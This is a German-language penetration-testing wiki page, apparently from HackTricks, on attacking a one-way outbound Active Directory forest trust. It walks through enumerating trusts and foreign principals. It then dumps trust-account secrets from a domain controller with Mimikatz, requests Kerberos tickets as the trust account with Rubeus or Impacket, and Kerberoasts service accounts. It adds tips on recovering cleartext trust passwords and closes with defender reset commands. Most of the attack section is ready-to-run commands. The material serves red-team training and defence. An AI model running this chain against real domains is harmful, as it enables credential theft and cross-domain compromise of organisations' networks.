# Externes Forest-Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

In diesem Szenario **vertraut deine Domain** einigen **Berechtigungen** für Principals aus einer **anderen Domain/Forest**.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Wenn dir das AD-Modul zur Verfügung steht, prüfe das **Trusted Domain Object (TDO)** ebenfalls direkt. So erhältst du die rohen, LDAP-gestützten Trust-Daten, die du später brauchst, um zu entscheiden, ob der einfache Weg **FSP/group abuse** oder **trust-account abuse** ist:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Du solltest auch auflisten, wo die Foreign Principals aus `CN=ForeignSecurityPrincipals` tatsächlich Zugriff erhalten haben. Häufige Erfolge sind:

- **Local admin** auf einem Server/DC in deiner aktuellen Domain
- Mitgliedschaft in einer **custom domain group**, die ACLs über Users/Computers/GPOs hat
- Rechte zum Ändern von **computer objects**, was später zu [RBCD](resource-based-constrained-delegation.md) werden kann, wenn die Trust-Konfiguration es erlaubt

## Trust Account Attack

Wenn ein One-Way-Trust von Domain/Forest **B** zu Domain/Forest **A** erstellt wird (**B trusts A**), wird ein **trust account** für **B** in **A** erstellt. In der Outbound-Trust-Ansicht von **A** ist das nützlich, weil du, wenn du später **B** kompromittierst (die trusting side), dort das Trust-Secret auslesen und dich wieder als `B$` bei **A** authentifizieren kannst.

Der entscheidende Punkt hier ist, dass das Passwort und die Kerberos-Materialien für dieses Trust-Account von einem Domain Controller in der **trusting** Domain mit Folgendem extrahiert werden können:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Das funktioniert, weil das im **trusted** Domain erstellte trust account ein aktiviertes Principal ist, das dort am Ende die grundlegenden Rechte eines normalen Domain-Users erhält. Das reicht oft aus, um mit LDAP-Enumeration zu beginnen, Tickets anzufordern und den nächsten escalation path zu finden.

In einem Szenario, in dem `ext.local` die **trusting** Domain und `root.local` die **trusted** Domain ist, wird ein User-Account namens `EXT$` innerhalb von `root.local` erstellt. Das Auslesen der trust keys aus `ext.local` offenbart credentials, die als `root.local\EXT$` gegen `root.local` verwendet werden können:
```bash
lsadump::trust /patch
```
Verwende anschließend den extrahierten **RC4**-Schlüssel, um dich als `root.local\EXT$` innerhalb von `root.local` zu authentifizieren:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Dann den vertrauenswürdigen Domain als dieses Prinzipal enumerieren, zum Beispiel indem man einen High-Value-SPN in `root.local` per Kerberoasting angreift:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Von Linux

Wenn du den **RC4**-Trust-Account-Key wiederhergestellt hast, funktioniert dieselbe Idee unter Linux mit Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Wenn **RC4** nicht akzeptiert wird, wechsle zum wiederhergestellten **Cleartext-Passwort** (oder abgeleiteten **AES**-Keys) und verwende die üblichen [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md)- und [Kerberoast](kerberoast.md)-Workflows von diesem foothold aus.

### Key-Material-Fallen

Verwechsle **Trust-Keys** und **Trust-Account-Credentials** nicht:

- In einem One-Way-Trust speichern beide Seiten ein **TDO**, aber das eigentliche **`EXT$` User-Account existiert nur in der Trusted Domain**.
- Das aktuelle Trust-Account-Passwort wird im TDO Trust-Secret (`NewPassword` / current trust key) abgebildet.
- Der **RC4** Trust-Key ist das am einfachsten wiederverwendbare Artefakt für `asktgt` als Trust-Account; in Standard-Setups ist dies meist der funktionierende enctype, weil der Trust-Account oft ein leeres `msDS-SupportedEncryptionTypes` hat.
- Wenn du in **AES Trust-Keys** denkst, denke daran, dass sie nicht mit den AES-Keys des Trust-Accounts austauschbar sind, weil sich die Salts unterscheiden.

Für die Technik auf dieser Seite solltest du daher entweder das gedumpte **RC4**-Material oder das wiederhergestellte **Cleartext**-Passwort bevorzugen.

### Cleartext-Trust-Passwort sammeln

Im vorherigen Ablauf wurde der Trust-Hash anstelle des **Cleartext-Passworts** verwendet (das auch von **mimikatz** gedumpt wird).

Das Cleartext-Passwort kann erhalten werden, indem man die \[ CLEAR ]-Ausgabe von mimikatz aus Hexadezimal umwandelt und Null-Bytes `\x00` entfernt:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

Manchmal muss beim Erstellen einer Trust-Relationship ein Passwort vom User für den Trust eingegeben werden. In dieser Demonstration ist der Key das ursprüngliche Trust-Passwort und daher lesbar. Wenn sich der Key rotiert (default: alle 30 Tage), ist der Cleartext normalerweise nicht mehr lesbar, aber technisch weiterhin nutzbar.

Das Cleartext-Passwort kann für eine normale Authentifizierung als Trust-Account verwendet werden, als Alternative dazu, ein TGT mit dem Kerberos-Secret-Key des Trust-Accounts anzufordern. Hier wird `root.local` von `ext.local` aus nach Mitgliedern von `Domain Admins` abgefragt:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Praktische Einschränkungen

> [!WARNING]
> Trust-Accounts sind umständliche Principals. Interaktive Logons wie **RUNAS / console / RDP** sind hier nicht der erwartete Weg, und **NTLM**-Authentifizierungsversuche können mit `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT` fehlschlagen. Plane stattdessen **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) ein.

### Persistence / Cleanup-Hinweis

Wenn Defender erkennen, dass die trusting domain kompromittiert wurde, sollten sie das Trust-Secret auf **beiden Seiten** mit `netdom trust ... /resetOneSide ...` rotieren. Aus Operator-Sicht ist das wichtig, weil ein **manueller Reset das alte Trust-Material sofort ungültig macht**, während die normale Trust-Passwort-Rotation die aktuellen/vorherigen Werte während des Rollovers weiter verfügbar hält.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Referenzen

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
